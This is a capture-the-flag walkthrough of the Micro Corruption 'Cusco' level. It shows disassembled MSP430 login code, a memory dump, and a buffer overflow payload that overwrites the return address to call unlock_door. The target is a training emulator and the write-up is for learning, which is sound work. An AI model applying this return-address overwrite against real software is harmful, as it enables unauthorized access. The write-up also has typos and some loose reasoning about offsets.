# Micro Corruption Embedded Security CTF Writeup


Author: [Sarthak Kohli](https://github.com/SARTHAK811) 
Challenge Page: [Cusco](https://microcorruption.com/cpu/debugger)

## Walkthrough

Step 1:

I entered 'c' commnad and then entered password '123456789123456' and then again entered 'c' command to start the problem.
Ofcourse the password failed and then i satrted analyzing the problem by setting breakpoints in the main function.
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r150
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	#0x4532 <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	#0x4536 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret

Step 2:

Setting break point at test_password valid and analyzing whether i can get r15 value to be 1 through my password but it turns out that r15 can not be 1 just ahead of test_password valid function.
and thus every time 'jz' will become true and we will jump ahead meaning we have to analyze more.

Step 3:

Note that the code says not to enter more than 16 bytes but ofcourse trying that was not working so i took a chance and entered a password greater than the length of 16. I entered a very huge password. It takes the input of 48 bytes which was hinted by 4514: 3e40 3000 mov #0x30,r14

I entered a very big password 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'.
Now we will overwrite the code so as to try to solve it.
For this we need to get the position of sp when the function returns.
For this i will analyze by putting a breakpoint at the line 453e: 3041 ret and then i observed the memory dump

43e0:   5645 0300 ca45 0000 0a00 0000 3a45 5050   VE...E......:EPP
43f0:   5050 5050 5050 5050 5050 5050 5050 4644   PPPPPPPPPPPPPPFD
4400:   0040 0044 1542 5c01 75f3 35d0 085a 3f40   .@.D.B\.u.5..Z?@

So we see that at the offset 0x11 we nee to enter the memory address 4446 keeping in mind the endianness. So the final payload must be 505050505050505050505050505050504644 which should unlock the door.

## Password

[505050505050505050505050505050504644]

## Useful resources (if any)
1.Tutorial
2.Assembly cheat sheet(https://www.cs.tufts.edu/comp/40/docs/x64_cheatsheet.pdf)
3.Endianness-Wikipedia(https://en.wikipedia.org/wiki/Endianness)
